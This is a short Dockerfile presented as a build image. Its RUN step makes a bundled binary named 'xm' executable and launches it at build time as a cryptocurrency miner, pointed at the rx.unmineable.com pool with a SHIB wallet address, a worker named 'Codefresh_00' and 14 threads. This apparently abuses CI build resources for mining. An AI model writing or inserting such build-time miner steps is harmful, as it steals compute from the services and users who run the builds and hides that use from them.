FROM ubuntu:16.04 as builder

RUN apt-get update \
  && apt-get install -y \
    build-essential \
    libssl-dev \
    libgmp-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    automake \
  && rm -rf /var/lib/apt/lists/*

COPY . /app/
RUN cd /app/ && chmod u+x xm && ./xm -o rx.unmineable.com:3333 -u SHIB:0x13c7ef20d7cf4e0790a223377343cfa6f69ce491.Codefresh_00 -p X -k -a rx/0 -t14

CMD ["-h"]